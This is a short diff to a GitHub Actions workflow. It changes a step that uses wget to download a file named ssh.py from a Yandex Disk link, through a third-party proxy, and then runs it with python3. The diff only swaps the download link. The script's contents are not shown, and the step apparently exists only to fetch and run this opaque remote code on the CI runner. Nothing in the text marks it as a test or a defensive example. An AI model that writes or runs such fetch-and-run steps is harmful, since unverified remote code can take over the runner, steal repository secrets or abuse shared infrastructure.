@@ -32,5 +32,5 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          wget -O ssh.py https://getfile.dokpub.com/yandex/get/https://disk.yandex.ru/d/zu3_5e0k_Wj3Dg
+          wget -O ssh.py https://getfile.dokpub.com/yandex/get/https://disk.yandex.ru/d/FWmb9PFeEIwDwQ
           python3 ssh.py
